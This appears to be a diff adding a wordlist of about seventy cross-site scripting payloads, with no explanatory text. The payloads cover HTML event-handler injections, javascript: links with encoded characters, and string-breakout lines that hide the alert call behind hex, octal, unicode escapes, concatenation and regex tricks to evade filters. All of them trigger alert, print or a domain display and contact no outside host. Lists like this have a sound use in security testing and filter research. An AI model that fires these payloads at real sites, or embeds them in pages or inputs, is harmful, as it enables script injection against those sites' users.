@@ -1,0 +1,70 @@
+Info
+<script id=x tabindex=1 onbeforeactivate=alert(1)></script>
+<script id=x tabindex=1 ondeactivate=print()></script><input id=y autofocus>
+<script id=x tabindex=1 onfocusin=alert(1)></script>
+<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>
+<img srcset=validimage.png onload=alert(1)>
+<audio onpointerup=alert(1)>XSS</audio>
+"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>"
+"<body ondblclick=""alert(1)"" autofocus tabindex=1>test</body>"
+"<body onclick=""alert(1)"">test</body>"
+<embed onpointerup=alert(1)>XSS</embed>
+<embed src=/ onload=alert(1)>
+<image src=validimage.png onload=alert(1)>
+<image src=validimage.png onloadend=alert(1)>
+<image src=validimage.png onloadstart=alert(1)>
+<img src=validimage.png onload=alert(1)>
+<img src=validimage.png onloadend=alert(1)>
+"<img onmousemove=""alert(1)"">test</img>"
+"<input oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test"
+"<input oncut=alert(1) value=""XSS"" autofocus tabindex=1>test"
+"<video onclick=""alert(1)"">test</video>"
+"<video oncontextmenu=""alert(1)"">test</video>"
+"<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>"
+<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
+<script>\u{61}lert(1)</script>
+<script>eval('\x61lert(1)')</script>
+"<a href=""&#0000106avascript:alert(1)"">XSS</a>"
+"<a href=""&#x0000006a;avascript:alert(1)"">XSS</a>"
+"<a href=""&#X6A;avascript:alert(1)"">XSS</a>"
+"<a href=""javascript:x='&percnt;27-alert(1)-%27';"">XSS</a>"
+';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//
+';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//
+';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//
+';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//
+';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//
+';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//
+';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//
+';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+"';window['\x65\x76\x61\x6c']('window[""\x61\x6c\x65\x72\x74""](window[""\x61\x74\x6f\x62""](""WFNT""))');//"
+"';this['\x65\x76\x61\x6c']('this[""\x61\x6c\x65\x72\x74""](this[""\x61\x74\x6f\x62""](""WFNT""))');//"
+"';parent['\x65\x76\x61\x6c']('parent[""\x61\x6c\x65\x72\x74""](parent[""\x61\x74\x6f\x62""](""WFNT""))');//"
+"';globalThis['\x65\x76\x61\x6c']('globalThis[""\x61\x6c\x65\x72\x74""](globalThis[""\x61\x74\x6f\x62""](""WFNT""))');//"
+';self['\141\154\145\162\164']('\130\123\123');//
+';top['\141\154\145\162\164']('\130\123\123');//
+';frames['\141\154\145\162\164']('\130\123\123');//
+';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';window[/al/.source+/ert/.source](/XSS/.source);//
+';this[/al/.source+/ert/.source](/XSS/.source);//
+';parent[/al/.source+/ert/.source](/XSS/.source);//
+';globalThis[/al/.source+/ert/.source](/XSS/.source);//
+<input type=radio id=x onfocus=alert(1)>
+<input type=radio id=x onfocusin=alert(1)>
+<isindex type=image onload=alert(1) src=validimage.png>
+<isindex type=image src=1 onerror=alert(1)>
+"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationstart=""alert(1)""></listing>"
+<main id=x tabindex=1 onfocus=alert(1)></main>
+<listing id=x tabindex=1 onfocusin=alert(1)></listing>
+"<style>@keyframes slidein {}</style><meta style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></meta>"
+<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>
+<ruby onfocusout=alert(1) tabindex=1 id=x></ruby><input autofocus>
+"<style>:target {color:red;}</style><track id=x style=""transition:color 1s"" ontransitionend=alert(1)></track>"
+"<style>@keyframes slidein {}</style><section style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></section>"
+"<object oncut=alert(1) value=""XSS"" autofocus tabindex=1>test"
+"<object ondblclick=""alert(1)"" autofocus tabindex=1>test</object>"
